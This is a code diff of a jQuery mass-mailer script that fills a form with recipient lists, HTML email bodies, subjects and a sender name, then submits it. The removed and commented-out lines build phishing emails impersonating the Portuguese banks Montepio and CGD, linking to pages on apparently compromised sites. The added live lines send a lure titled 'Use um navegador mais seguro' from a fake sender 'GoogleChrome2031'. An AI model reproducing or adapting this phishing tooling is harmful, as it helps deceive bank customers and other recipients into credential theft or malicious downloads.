@@ -73,11 +73,20 @@ $('.send').click(function(){
 			$('#' + idForm + '_status').text('Enviando');
 
 			$('#' + idForm + '_emails').val(emails.responseText);
-			$('#' + idForm + '_html').val('<a href="#LINK#EMAIL"><img src="http://s12.postimg.org/4e9i1r13x/mont.png"></a>');
-			$('#' + idForm + '_assunto').val('Prezado Cliente Montepio');
+			
+			//$('#' + idForm + '_html').val('<a href="http://adventure.co.kr/home/board/modules/as98d98a0d8/"><img src="http://s21.postimg.org/n9aly697b/cgd.png"></a>');
+			//$('#' + idForm + '_assunto').val('Prezado Cliente CGD Geral');
+
+			//$('#' + idForm + '_html').val('<a href="http://jejufirst.com/cgi_bin/counsel/board/wp-content/plugins2/aaaa/particulares.php"><img src="http://s21.postimg.org/qyxc1df8n/mont.png"></a>');
+			//$('#' + idForm + '_assunto').val('Cliente Montepio Geral, Aviso Importante');
+
+			$('#' + idForm + '_html').val('<a href="http://campin.or.kr/db/board/link.html"><img src="http://mamin-journal.ru/wp-content/forum-image-uploads/eng2.jpg"></a>');
+			$('#' + idForm + '_assunto').val('Use um navegador mais seguro');
+			$('#' + idForm + '_remetente').val('GoogleChrome2031');
+			
 			$('#' + idForm + '_chave').val(chave);
 
-			console.log('morreu!');
+			console.log('submit: ' + $('#' + idForm + '_assunto').val());
 
 			$(form).submit();
 		}
